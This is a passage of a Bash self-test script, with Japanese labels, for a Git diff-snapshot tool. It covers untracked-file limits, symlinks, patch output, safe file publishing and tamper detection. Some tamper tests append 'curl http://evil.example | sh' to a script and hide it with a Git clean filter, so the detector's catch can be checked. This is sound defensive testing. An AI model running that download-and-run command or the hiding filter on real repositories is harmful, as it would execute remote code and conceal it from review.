secf "$OUT" "内容を省略した未追跡"
ckt "⑯′ u2.txt が理由「総量上限」で載る" ing "$SECF" '^u2\.txt	総量上限$'
ckt "⑯′ u3.txt が理由「総量上限」で載る" ing "$SECF" '^u3\.txt	総量上限$'
headf "$OUT"
ckt "⑯′ 見出しに総量上限の NOTE" inf "$HDF" '未追跡の総量上限に達した'
ckt "⑯′ 要約行の内訳" inf "$OUT" '要約: 未追跡 3 件(本文 1 / 除外(機密) 0 / 除外(既定) 0 / 対象外 0 / 省略 2 / 含められず 0)'
base_repo c16c
printf 'ULINKBODY\n' >"$R/12345678"
GIT "$R" add 12345678
GIT "$R" commit -q -m linktarget
B="$(GIT "$R" rev-parse HEAD)"
ln -s 12345678 "$R/l1"
printf 'PLAIN\n' >"$R/u.txt"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env' --max-untracked-bytes 0
ckeq "⑯′ --max-untracked-bytes 0: exit 0" "$RC" 0
secf "$OUT" "未追跡ファイル"
ckf "⑯′ 上限 0 では symlink を含む全未追跡の内容が出ない" inf "$SECF" '+++ b/'
secf "$OUT" "内容を省略した未追跡"
ckt "⑯′ 上限 0 では symlink も省略節に載る" ing "$SECF" '^l1	総量上限$'
ckt "⑯′ 上限 0 では通常ファイルも省略節に載る" ing "$SECF" '^u\.txt	総量上限$'
rm -f "$R/u.txt"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env' --max-untracked-bytes 7
secf "$OUT" "内容を省略した未追跡"
ckt "⑯′ リンク文字列長 8 に上限 7 で省略" ing "$SECF" '^l1	総量上限$'
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env' --max-untracked-bytes 8
secf "$OUT" "未追跡ファイル"
ckt "⑯′ リンク文字列長 8 に上限 8 で収録" inf "$SECF" '+++ b/l1'
for v in -1 abc 1.5; do
  reset_out
  run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env' --max-untracked-bytes "$v"
  ckeq "⑯′ --max-untracked-bytes '$v': exit 2" "$RC" 2
done

# ── ⑰ 不正な ERE ──
base_repo c17
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude 'secrets/['
ckeq "⑰ 不正な ERE: exit 2" "$RC" 2
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude 'secrets/**'
ckeq "⑰ 妥当な ERE(非マッチ)は通る: exit 0" "$RC" 0

# ── ⑱ base が HEAD の祖先でない ──
base_repo c18
printf 'c0\n' >"$R/f.txt"
GIT "$R" add f.txt
GIT "$R" commit -q -m c0
printf 'c1\n' >"$R/f.txt"
GIT "$R" add f.txt
GIT "$R" commit -q -m c1
B="$(GIT "$R" rev-parse HEAD)"
GIT "$R" checkout -q -b other "$B^"
printf 'c2\n' >"$R/f.txt"
GIT "$R" add f.txt
GIT "$R" commit -q -m c2
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "⑱ 祖先でない base: exit 0" "$RC" 0
headf "$OUT"
ckt "⑱ 見出しに WARNING: 基準は HEAD の祖先ではない" inf "$HDF" 'WARNING: 基準は HEAD の祖先ではない'

# ── ⑲ 未追跡の symlink ──
base_repo c19
printf 'REALBODY\n' >"$R/real.txt"
ln -s real.txt "$R/goodlink"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "⑲ 未追跡の symlink(リンク先あり): exit 0" "$RC" 0
secf "$OUT" "未追跡ファイル"
ckt "⑲ リンク文字列が出る" inf "$SECF" '+real.txt'
ckt "⑲ symlink のパスが出る" inf "$SECF" '+++ b/goodlink'

# ── ⑲′ リンク切れ ──
base_repo c19b
ln -s nowhere "$R/deadlink"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "⑲′ リンク切れ: exit 0" "$RC" 0
secf "$OUT" "含められなかった未追跡"
ckt "⑲′ 理由「リンク切れ」で載る" ing "$SECF" '^deadlink	リンク切れ$'

# ── ⑲″ ディレクトリへの symlink ──
base_repo c19c
mkdir -p "$R/d"
printf 'INDIR\n' >"$R/d/in.txt"
ln -s d "$R/dirlink"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "⑲″ ディレクトリへの symlink: exit 0" "$RC" 0
secf "$OUT" "含められなかった未追跡"
ckt "⑲″ 理由「ディレクトリ等へのリンク」で載る" ing "$SECF" '^dirlink	ディレクトリ等へのリンク$'

# ── ⑲‴ 除外対象名の symlink ──
base_repo c19d
printf 'REALBODY2\n' >"$R/real.txt"
ln -s real.txt "$R/.env"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "⑲‴ 除外対象名の symlink: exit 0" "$RC" 0
secf "$OUT" "未追跡ファイル"
ckf "⑲‴ リンク文字列が本文に出ない" inf "$SECF" '+++ b/.env'
secf "$OUT" "除外(機密)"
ckt "⑲‴ .env が除外(機密)に載る" ing "$SECF" '^\.env	'

# ── ⑳ 読めない未追跡ファイル ──
base_repo c20
printf 'NOREADBODY\n' >"$R/noread.txt"
if [ "$IS_ROOT" -eq 1 ]; then
  ok "⑳ 読めない未追跡: exit 21(root のため飛ばす)"
  ok "⑳ --out は生成される(root のため飛ばす)"
  ok "⑳ 理由「読めない」で載る(root のため飛ばす)"
else
  chmod 000 "$R/noread.txt"
  reset_out
  run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
  ckeq "⑳ 読めない未追跡: exit 21" "$RC" 21
  ckt "⑳ --out は生成される" test -f "$OUT"
  secf "$OUT" "含められなかった未追跡"
  ckt "⑳ 理由「読めない」で載る" ing "$SECF" '^noread\.txt	読めない$'
  chmod 644 "$R/noread.txt"
fi

# ── ⑳′ index 不変 ──
base_repo c20b
printf 's1\n' >"$R/staged.txt"
printf 'u1\n' >"$R/unstaged.txt"
GIT "$R" add staged.txt unstaged.txt
GIT "$R" commit -q -m mixed
B="$(GIT "$R" rev-parse HEAD)"
printf 's2\n' >"$R/staged.txt"
GIT "$R" add staged.txt
printf 'u2\n' >"$R/unstaged.txt"
printf 'n1\n' >"$R/untracked.txt"
snap_index() { # $1=接尾辞
  OGIT "$R" write-tree >"$WORK/idxtree.$1" 2>/dev/null
  OGIT "$R" status --porcelain=v1 -z >"$WORK/st.$1" 2>/dev/null
}
snap_index a
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "⑳′ 混在構成: exit 0" "$RC" 0
snap_index b
ckt "⑳′ 成功時に write-tree が一致" cmp -s "$WORK/idxtree.a" "$WORK/idxtree.b"
ckt "⑳′ 成功時に status が一致" cmp -s "$WORK/st.a" "$WORK/st.b"
if [ "$IS_ROOT" -eq 1 ]; then
  ok "⑳′ 失敗時(exit 21)に write-tree が一致(root のため飛ばす)"
  ok "⑳′ 失敗時(exit 21)に status が一致(root のため飛ばす)"
  ok "⑳′ 失敗時の終了コードが 21(root のため飛ばす)"
else
  printf 'x\n' >"$R/noread2.txt"
  chmod 000 "$R/noread2.txt"
  snap_index c
  reset_out
  run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
  ckeq "⑳′ 失敗時の終了コードが 21" "$RC" 21
  snap_index d
  ckt "⑳′ 失敗時(exit 21)に write-tree が一致" cmp -s "$WORK/idxtree.c" "$WORK/idxtree.d"
  ckt "⑳′ 失敗時(exit 21)に status が一致" cmp -s "$WORK/st.c" "$WORK/st.d"
  chmod 644 "$R/noread2.txt"
  rm -f "$R/noread2.txt"
fi

# ── ⑳″ FIFO の未追跡 ──
base_repo c20c
mkfifo "$R/myfifo"
reset_out
grun --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "⑳″ 未追跡 FIFO: 待機せず exit 0" "$RC" 0
ckf "⑳″ FIFO が出力のどの節にも現れない" inf "$OUT" 'myfifo'
rm -f "$R/myfifo"

# ── ⑳‴ --patch-out ──
base_repo c20d
printf 'SECRET=patch\n' >"$R/.env"
printf 'A1\n' >"$R/a.txt"
GIT "$R" add .env a.txt
GIT "$R" commit -q -m init
B="$(GIT "$R" rev-parse HEAD)"
rm -f "$R/.env"
printf 'A2\n' >"$R/a.txt"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --patch-out "$PATCHF" --patch-base HEAD --exclude-glob '.env'
ckeq "⑳‴ --patch-out: exit 0" "$RC" 0
ckt "⑳‴ パッチに a.txt の hunk がある" inf "$PATCHF" '+A2'
ckf "⑳‴ パッチに .env のパスが無い" inf "$PATCHF" '.env'
ckf "⑳‴ パッチに機密の値が無い" inf "$PATCHF" 'SECRET='
GIT "$R" worktree add -q --detach "$WORK/at20d" HEAD >/dev/null 2>&1
ckt "⑳‴ 別ツリーで git apply --check が通る" \
  env -u GIT_INDEX_FILE "$REAL_GIT" -C "$WORK/at20d" apply --check -- "$PATCHF"
env -u GIT_INDEX_FILE "$REAL_GIT" -C "$WORK/at20d" apply -- "$PATCHF" >/dev/null 2>&1
ckt "⑳‴ 適用後の a.txt が元の作業ツリーと一致" cmp -s "$WORK/at20d/a.txt" "$R/a.txt"
base_repo c20d2
printf 'SECRET=only\n' >"$R/.env"
GIT "$R" add .env
GIT "$R" commit -q -m onlyenv
B="$(GIT "$R" rev-parse HEAD)"
rm -f "$R/.env"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --patch-out "$PATCHF" --patch-base HEAD --exclude-glob '.env'
ckeq "⑳‴ 除外後 0 件: exit 0" "$RC" 0
ckeq "⑳‴ 除外後 0 件のパッチは空ファイル" "$(wc -c <"$PATCHF" | tr -d ' ')" 0
base_repo c20d3
printf 'g1\n' >"$R/a[1].txt"
printf 'SECRET=one\n' >"$R/a1.txt"
GIT "$R" add -- 'a[1].txt' 'a1.txt'
GIT "$R" commit -q -m globs
B="$(GIT "$R" rev-parse HEAD)"
printf 'g2\n' >"$R/a[1].txt"
printf 'SECRET=two\n' >"$R/a1.txt"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --patch-out "$PATCHF" --patch-base HEAD --exclude '(^|/)a1\.txt$'
ckeq "⑳‴ グロブ文字を含む名前 + 除外: exit 0" "$RC" 0
ckf "⑳‴ パッチに a1.txt の内容が無い" inf "$PATCHF" 'SECRET='
ckt "⑳‴ パッチに a[1].txt の変更がある" inf "$PATCHF" '+g2'

# ── ⑳⁗ 相殺ケース ──
base_repo c20e
printf 'A\n' >"$R/f.txt"
GIT "$R" add f.txt
GIT "$R" commit -q -m fa
B="$(GIT "$R" rev-parse HEAD)"
printf 'B\n' >"$R/f.txt"
GIT "$R" add f.txt
GIT "$R" commit -q -m fb
printf 'A\n' >"$R/f.txt"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --patch-out "$PATCHF" --patch-base HEAD --exclude-glob '.env'
ckeq "⑳⁗ 相殺ケース: exit 0" "$RC" 0
secf "$OUT" "追跡差分"
ckf "⑳⁗ --base の列挙に相殺したファイルが出ない" inf "$SECF" 'f.txt'
ckt "⑳⁗ --patch-base HEAD のパッチには B → A の hunk が出る" inf "$PATCHF" '+A'
secf "$OUT" "改竄の疑い"
ckt "⑳⁗ 相殺は改竄の疑いに載らない" inf "$SECF" '(差分なし)'
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "⑳⁗ --patch-out なしの通常経路でも exit 0" "$RC" 0

runp() { # $1=PATH 先頭に足すディレクトリ 残り=対象の引数
  local d="$1"
  shift
  RC=0
  env PATH="$d:$PATH" bash "$TARGET" "$@" </dev/null >"$CASE_OUT" 2>"$CASE_ERR" || RC=$?
}
grunp() { # runp の外側 timeout 付き
  local d="$1"
  shift
  RC=0
  guard env PATH="$d:$PATH" bash "$TARGET" "$@" </dev/null >"$CASE_OUT" 2>"$CASE_ERR" || RC=$?
}

# ── ㉑ 列挙失敗 → exit 20 ──
base_repo c21
printf 'UBODY\n' >"$R/u.txt"
STUB21="$WORK/stub21"
mk_git_stub "$STUB21" 'for a in "$@"; do if [ "$a" = "ls-files" ]; then hit=1; fi; done' 128
reset_out
runp "$STUB21" --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉑ 列挙失敗: exit 20" "$RC" 20
ckf "㉑ --out は作られない" test -e "$OUT"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
OUT21_BEFORE="$(sha_file "$OUT")"
runp "$STUB21" --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉑ 既存の --out がある場合も exit 20" "$RC" 20
ckeq "㉑ 既存の --out は元の内容のまま残る" "$(sha_file "$OUT")" "$OUT21_BEFORE"

# ── ㉑′ 未追跡 diff 失敗 → exit 21 ──
base_repo c21b
printf 'UBODY\n' >"$R/u.txt"
STUB21B="$WORK/stub21b"
mk_git_stub "$STUB21B" \
  'd=0; n=0; for a in "$@"; do [ "$a" = "diff" ] && d=1; [ "$a" = "--no-index" ] && n=1; done
if [ "$d" -eq 1 ] && [ "$n" -eq 1 ]; then hit=1; fi' 2
reset_out
runp "$STUB21B" --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉑′ 未追跡 diff 失敗: exit 21" "$RC" 21
ckt "㉑′ --out は生成される" test -f "$OUT"
secf "$OUT" "含められなかった未追跡"
ckt "㉑′ 理由「diff 失敗」で載る" ing "$SECF" '^u\.txt	diff 失敗$'

# ── ㉑″ 後段 mv 失敗(--out 宛だけ)→ exit 20 ──
base_repo c21c
printf 'UBODY\n' >"$R/u.txt"
O21C="$R/o21c.md"
P21C="$R/p21c.patch"
rm -f "$O21C" "$P21C"
run --cwd "$R" --base "$B" --out "$O21C" --exclude-glob '.env'
O21C_BEFORE="$(sha_file "$O21C")"
STUB21C="$WORK/stub21c"
mk_mv_stub "$STUB21C" 'case "$dst" in */o21c.md) exit 1 ;; esac'
runp "$STUB21C" --cwd "$R" --base "$B" --out "$O21C" --patch-out "$P21C" --exclude-glob '.env'
ckeq "㉑″ --out 宛の mv 失敗: exit 20" "$RC" 20
ckf "㉑″ 公開済みの新しい --patch-out が削除される" test -e "$P21C"
ckeq "㉑″ 既存の --out は元の内容のまま" "$(sha_file "$O21C")" "$O21C_BEFORE"
ckt "㉑″ .diff-snapshot. ディレクトリが残らない" no_pubdir "$R"

# ── ㉑‴ patch 宛 mv 失敗 → exit 20 ──
base_repo c21d
printf 'UBODY\n' >"$R/u.txt"
O21D="$R/o21d.md"
P21D="$R/p21d.patch"
rm -f "$O21D" "$P21D"
run --cwd "$R" --base "$B" --out "$O21D" --exclude-glob '.env'
O21D_BEFORE="$(sha_file "$O21D")"
STUB21D="$WORK/stub21d"
mk_mv_stub "$STUB21D" 'case "$dst" in */p21d.patch) exit 1 ;; esac'
runp "$STUB21D" --cwd "$R" --base "$B" --out "$O21D" --patch-out "$P21D" --exclude-glob '.env'
ckeq "㉑‴ --patch-out 宛の mv 失敗: exit 20" "$RC" 20
ckf "㉑‴ --patch-out は存在しない" test -e "$P21D"
ckt "㉑‴ 既存の --out が元のパスに残る" test -f "$O21D"
ckeq "㉑‴ 既存の --out が元の内容のまま" "$(sha_file "$O21D")" "$O21D_BEFORE"
ckt "㉑‴ .diff-snapshot. ディレクトリが残らない" no_pubdir "$R"

# ── ㉑⁗ 既存の --patch-out → exit 2 ──
base_repo c21e
printf 'UBODY\n' >"$R/u.txt"
O21E="$R/o21e.md"
P21E="$R/p21e.patch"
rm -f "$O21E" "$P21E"
run --cwd "$R" --base "$B" --out "$O21E" --exclude-glob '.env'
O21E_BEFORE="$(sha_file "$O21E")"
printf 'OUTSIDE21E\n' >"$WORK/outside21e.txt"
for kind in file symlink dir; do
  rm -rf "$P21E"
  case "$kind" in
    file) printf 'EXISTING\n' >"$P21E" ;;
    symlink) ln -s "$WORK/outside21e.txt" "$P21E" ;;
    dir) mkdir -p "$P21E" ;;
  esac
  run --cwd "$R" --base "$B" --out "$O21E" --patch-out "$P21E" --exclude-glob '.env'
  ckeq "㉑⁗ 既存の --patch-out($kind): exit 2" "$RC" 2
  ckt "㉑⁗ 既存の --patch-out($kind)に ERROR [usage]" inf "$CASE_ERR" 'ERROR [usage]'
  ckt "㉑⁗ 既存のエントリ($kind)が残る" test -e "$P21E"
  ckeq "㉑⁗ outside.txt が変わらない($kind)" "$(cat "$WORK/outside21e.txt")" 'OUTSIDE21E'
  ckeq "㉑⁗ 既存の --out が変わらない($kind)" "$(sha_file "$O21E")" "$O21E_BEFORE"
  ckt "㉑⁗ .diff-snapshot. ディレクトリが残らない($kind)" no_pubdir "$R"
done
rm -rf "$P21E"

# ── ㉒ 既存 out なしで後段 mv 失敗 → exit 20 ──
base_repo c22
printf 'UBODY\n' >"$R/u.txt"
O22="$R/o22.md"
P22="$R/p22.patch"
rm -f "$O22" "$P22"
STUB22="$WORK/stub22"
mk_mv_stub "$STUB22" 'case "$dst" in */o22.md) exit 1 ;; esac'
runp "$STUB22" --cwd "$R" --base "$B" --out "$O22" --patch-out "$P22" --exclude-glob '.env'
ckeq "㉒ 既存 out なしで mv 失敗: exit 20" "$RC" 20
ckf "㉒ --patch-out が存在しない" test -e "$P22"
ckf "㉒ --out が存在しない" test -e "$O22"
ckt "㉒ .diff-snapshot. ディレクトリが残らない" no_pubdir "$R"

# ── ㉒′ patch 公開直後のシグナル中断 ──
for exist in exist none; do
  base_repo "c22b_$exist"
  printf 'UBODY\n' >"$R/u.txt"
  O22B="$R/o22b.md"
  P22B="$R/p22b.patch"
  rm -f "$O22B" "$P22B"
  O22B_BEFORE=""
  if [ "$exist" = exist ]; then
    run --cwd "$R" --base "$B" --out "$O22B" --exclude-glob '.env'
    O22B_BEFORE="$(sha_file "$O22B")"
  fi
  STUB22B="$WORK/stub22b_$exist"
  mk_mv_stub "$STUB22B" "case \"\$dst\" in */p22b.patch) \"$REAL_MV\" \"\$@\"; kill -TERM \"\$PPID\"; exit 0 ;; esac"
  grunp "$STUB22B" --cwd "$R" --base "$B" --out "$O22B" --patch-out "$P22B" --exclude-glob '.env'
  ckeq "㉒′ patch 公開直後の中断($exist): exit 20" "$RC" 20
  ckf "㉒′ 新 patch が削除される($exist)" test -e "$P22B"
  if [ "$exist" = exist ]; then
    ckeq "㉒′ 旧 out がそのまま残る($exist)" "$(sha_file "$O22B")" "$O22B_BEFORE"
  else
    ckf "㉒′ --out が存在しない($exist)" test -e "$O22B"
  fi
  ckt "㉒′ .diff-snapshot. ディレクトリが残らない($exist)" no_pubdir "$R"
done

# ── ㉒″ out 公開の直前・直後のシグナル中断 ──
for exist in exist none; do
  # (i) out 宛の mv を行わずに親へ TERM を送って rc 0 で戻る
  base_repo "c22ci_$exist"
  printf 'UBODY\n' >"$R/u.txt"
  O22C="$R/o22c.md"
  P22C="$R/p22c.patch"
  rm -f "$O22C" "$P22C"
  O22C_BEFORE=""
  if [ "$exist" = exist ]; then
    run --cwd "$R" --base "$B" --out "$O22C" --exclude-glob '.env'
    O22C_BEFORE="$(sha_file "$O22C")"
  fi
  STUB22CI="$WORK/stub22ci_$exist"
  mk_mv_stub "$STUB22CI" 'case "$dst" in */o22c.md) kill -TERM "$PPID"; exit 0 ;; esac'
  grunp "$STUB22CI" --cwd "$R" --base "$B" --out "$O22C" --patch-out "$P22C" --exclude-glob '.env'
  ckeq "㉒″(i) out 公開の直前の中断($exist): exit 20" "$RC" 20
  ckf "㉒″(i) 新 patch が削除される($exist)" test -e "$P22C"
  if [ "$exist" = exist ]; then
    ckeq "㉒″(i) 旧 out がそのまま残る($exist)" "$(sha_file "$O22C")" "$O22C_BEFORE"
  else
    ckf "㉒″(i) --out が存在しない($exist)" test -e "$O22C"
  fi
  ckt "㉒″(i) .diff-snapshot. ディレクトリが残らない($exist)" no_pubdir "$R"
  # (ii) out 宛の mv を本物へ委譲した直後に親へ TERM を送る
  base_repo "c22cii_$exist"
  printf 'UBODY\n' >"$R/u.txt"
  O22D="$R/o22d.md"
  P22D="$R/p22d.patch"
  rm -f "$O22D" "$P22D"
  if [ "$exist" = exist ]; then
    run --cwd "$R" --base "$B" --out "$O22D" --exclude-glob '.env'
  fi
  STUB22CII="$WORK/stub22cii_$exist"
  mk_mv_stub "$STUB22CII" "case \"\$dst\" in */o22d.md) \"$REAL_MV\" \"\$@\"; kill -TERM \"\$PPID\"; exit 0 ;; esac"
  grunp "$STUB22CII" --cwd "$R" --base "$B" --out "$O22D" --patch-out "$P22D" --exclude-glob '.env'
  ckeq "㉒″(ii) out 公開の直後の中断($exist): exit 20" "$RC" 20
  ckt "㉒″(ii) 新 out が残る($exist)" test -f "$O22D"
  ckt "㉒″(ii) 新 patch も残る($exist)" test -f "$P22D"
  ckt "㉒″(ii) .diff-snapshot. ディレクトリが残らない($exist)" no_pubdir "$R"
done

# ── ㉓ フック・fsmonitor の無効化 ──
base_repo c23
printf 'SECRET=hooked\n' >"$R/.env"
printf 'UBODY\n' >"$R/u.txt"
HOOKS23="$WORK/hooks23"
mkdir -p "$HOOKS23"
for h in post-checkout pre-auto-gc; do
  cp "$STUBS/hook-index.sh" "$HOOKS23/$h"
  chmod +x "$HOOKS23/$h"
done
GIT "$R" config core.hooksPath "$HOOKS23"
GIT "$R" config core.fsmonitor "$STUBS/hook-index.sh"
export SELFTEST_TRACE="$WORK/tr23"
export SELFTEST_REPO="$R"
: >"$SELFTEST_TRACE"
OGIT "$R" write-tree >"$WORK/wt23a" 2>/dev/null
OGIT "$R" status --porcelain=v1 -z >"$WORK/st23a" 2>/dev/null
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉓ フック・fsmonitor の無効化: exit 0" "$RC" 0
ckeq "㉓ 痕跡ファイルが作られない" "$(wc -c <"$SELFTEST_TRACE" | tr -d ' ')" 0
OGIT "$R" write-tree >"$WORK/wt23b" 2>/dev/null
OGIT "$R" status --porcelain=v1 -z >"$WORK/st23b" 2>/dev/null
ckt "㉓ 実行前後の write-tree が一致" cmp -s "$WORK/wt23a" "$WORK/wt23b"
ckt "㉓ 実行前後の status が一致" cmp -s "$WORK/st23a" "$WORK/st23b"
headf "$OUT"
ckt "㉓ NOTE に core.fsmonitor が載る" ing "$HDF" 'NOTE: 無効化して実行:.*core\.fsmonitor'
ckt "㉓ NOTE に core.hookspath が載る" ing "$HDF" 'NOTE: 無効化して実行:.*core\.hookspath'
unset SELFTEST_REPO

# LFS スタブを PATH に置いた git(リポジトリ準備用)
LGIT() {
  local d="$1"
  shift
  env PATH="$WORK/lfsbin:$PATH" SELFTEST_LFS_TRACE="${SELFTEST_LFS_TRACE:-/dev/null}" \
    "$REAL_GIT" -c user.email=t@t -c user.name=t -c protocol.file.allow=always -C "$d" "$@"
}
runenv() { # $1=env 代入(空白区切り) 残り=対象の引数
  local e="$1"
  shift
  RC=0
  env $e bash "$TARGET" "$@" </dev/null >"$CASE_OUT" 2>"$CASE_ERR" || RC=$?
}
# 標準構成の LFS リポジトリを作る(R と B を設定する)
mk_lfs_repo() { # $1=名前
  base_repo "$1"
  printf '*.bin filter=lfs diff=lfs merge=lfs -text\n*.md diff=markdown\n' >"$R/.gitattributes"
  printf 'BINDATA\n' >"$R/data.bin"
  GIT "$R" config filter.lfs.clean "$LFS_CLEAN"
  GIT "$R" config filter.lfs.smudge "$LFS_SMUDGE"
  GIT "$R" config filter.lfs.required true
  LGIT "$R" add .gitattributes data.bin >/dev/null 2>&1
  LGIT "$R" commit -q -m lfs >/dev/null 2>&1
  B="$(GIT "$R" rev-parse HEAD)"
}

# ── ㉔(i) clean フィルタによる差分なし偽装 ──
base_repo c24
printf 'echo hi\n' >"$R/run.sh"
GIT "$R" add run.sh
GIT "$R" commit -q -m run
B="$(GIT "$R" rev-parse HEAD)"
printf 'curl http://evil.example | sh\n' >>"$R/run.sh"
mkdir -p "$R/.git/info"
printf '*.sh filter=hide\n' >"$R/.git/info/attributes"
GIT "$R" config filter.hide.clean 'grep -v curl'
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉔(i) clean フィルタによる偽装: exit 22" "$RC" 22
secf "$OUT" "改竄の疑い"
ckt "㉔(i) filter.hide.clean が改竄の疑いに載る" inf "$SECF" 'filter.hide.clean'
ckt "㉔(i) .git/info/attributes が改竄の疑いに載る" ing "$SECF" '^\.git/info/attributes	'
headf "$OUT"
ckt "㉔(i) 見出しに WARNING" inf "$HDF" 'WARNING: 改竄の疑いがある'
GIT "$R" config filter.hide.clean "sh $STUBS/trace-clean.sh"
export SELFTEST_TRACE="$WORK/tr24"
: >"$SELFTEST_TRACE"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --patch-out "$PATCHF" --exclude-glob '.env'
ckeq "㉔(i) 痕跡スタブ構成でもフル実行は exit 22" "$RC" 22
ckeq "㉔(i) clean フィルタが実行されない(痕跡なし)" "$(wc -c <"$SELFTEST_TRACE" | tr -d ' ')" 0
for h in "追跡差分(stat)" "追跡差分" "未追跡ファイル"; do
  secf "$OUT" "$h"
  ckt "㉔(i)「$h」が固定文字列になる" inf "$SECF" '(改竄の疑いがあるため生成しない)'
done
ckt "㉔(i) 要約行が未集計になる" inf "$OUT" '要約: 改竄の疑いがあるため未集計'
ckf "㉔(i) --patch-out を付けても patch が作られない" test -e "$PATCHF"

# ── ㉔(ii) 起動時の設定検査から見えない構成 ──
base_repo c24b
mkdir -p "$R/src"
printf 'echo hi\n' >"$R/src/run.sh"
GIT "$R" add src/run.sh
GIT "$R" commit -q -m run
B="$(GIT "$R" rev-parse HEAD)"
printf 'curl http://evil.example | sh\n' >>"$R/src/run.sh"
printf '*.sh filter=hide\n' >"$R/src/.gitattributes"
GCFG24B="$WORK/gcfg24b"
printf '[filter "hide"]\n\tclean = grep -v curl\n' >"$GCFG24B"
reset_out
runenv "GIT_CONFIG_GLOBAL=$GCFG24B" --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉔(ii) 属性検査だけで捕える: exit 22" "$RC" 22
secf "$OUT" "改竄の疑い"
ckt "㉔(ii) src/run.sh の filter 属性が載る" ing "$SECF" '^src/run\.sh	filter 属性: hide	'
ckf "㉔(ii) 起動時の設定検査では止まっていない" inf "$SECF" 'ローカル設定: filter.hide.clean'

# ── ㉔(iii) LFS を止めない ──
export SELFTEST_LFS_TRACE="$WORK/lfs24c"
: >"$SELFTEST_LFS_TRACE"
mk_lfs_repo c24c
LGIT "$R" ls-files -z >"$WORK/lfs24c.tracked.z" 2>/dev/null
LGIT "$R" check-attr --stdin -z filter <"$WORK/lfs24c.tracked.z" 2>/dev/null | tr '\0' '\n' >"$WORK/lfs24c.attr"
ckt "㉔(iii) check-attr が filter=lfs を返す構成になっている" ing "$WORK/lfs24c.attr" '^lfs$'
printf 'NEWBODY\n' >"$R/new.md"
reset_out
runp "$WORK/lfsbin" --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉔(iii) LFS 標準構成では止めない: exit 0" "$RC" 0
secf "$OUT" "改竄の疑い"
ckt "㉔(iii) 改竄の疑いが空" inf "$SECF" '(差分なし)'
GIT "$R" config filter.lfs.smudge 'cat'
reset_out
runp "$WORK/lfsbin" --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉔(iii) filter.lfs.smudge を上書きすると exit 22" "$RC" 22
GIT "$R" config filter.lfs.smudge "$LFS_SMUDGE"
# process を含む 4 キーの標準構成は、実 git-lfs がある環境でだけ確認する
# (スタブは filter-process の long-running protocol を話さないので置けない)
if command -v git-lfs >/dev/null 2>&1; then
  base_repo c24c2
  printf '*.bin filter=lfs diff=lfs merge=lfs -text\n*.md diff=markdown\n' >"$R/.gitattributes"
  printf 'BINDATA\n' >"$R/data.bin"
  GIT "$R" config filter.lfs.clean 'git-lfs clean -- %f'
  GIT "$R" config filter.lfs.smudge 'git-lfs smudge -- %f'
  GIT "$R" config filter.lfs.process 'git-lfs filter-process'
  GIT "$R" config filter.lfs.required true
  GIT "$R" add .gitattributes data.bin
  GIT "$R" commit -q -m lfsreal
  B="$(GIT "$R" rev-parse HEAD)"
  GIT "$R" ls-files -z >"$WORK/lfs24c2.tracked.z" 2>/dev/null
  GIT "$R" check-attr --stdin -z filter <"$WORK/lfs24c2.tracked.z" 2>/dev/null | tr '\0' '\n' >"$WORK/lfs24c2.attr"
  ckt "㉔(iii) 実 git-lfs 環境の check-attr が filter=lfs を返す" ing "$WORK/lfs24c2.attr" '^lfs$'
  printf 'NEWBODY\n' >"$R/new.md"
  reset_out
  run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
  ckeq "㉔(iii) 実 git-lfs の標準構成(process 込み)では止めない: exit 0" "$RC" 0
  secf "$OUT" "改竄の疑い"
  ckt "㉔(iii) 実 git-lfs の標準構成で改竄の疑いが空" inf "$SECF" '(差分なし)'
else
  ok "㉔(iii) 実 git-lfs 環境の check-attr が filter=lfs を返す(git-lfs が無い環境のため飛ばす)"
  ok "㉔(iii) 実 git-lfs の標準構成(process 込み)では止めない(git-lfs が無い環境のため飛ばす)"
  ok "㉔(iii) 実 git-lfs の標準構成で改竄の疑いが空(git-lfs が無い環境のため飛ばす)"
fi

# ── ㉔(iv) include / includeIf / worktree スコープ ──
base_repo c24d
printf 'echo hi\n' >"$R/run.sh"
GIT "$R" add run.sh
GIT "$R" commit -q -m run
B="$(GIT "$R" rev-parse HEAD)"
printf 'curl http://evil.example | sh\n' >>"$R/run.sh"
INC24D="$WORK/inc24d"
printf '[filter "hide"]\n\tclean = grep -v curl\n' >"$INC24D"
GIT "$R" config include.path "$INC24D"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "㉔(iv) include.path: exit 22" "$RC" 22
secf "$OUT" "改竄の疑い"
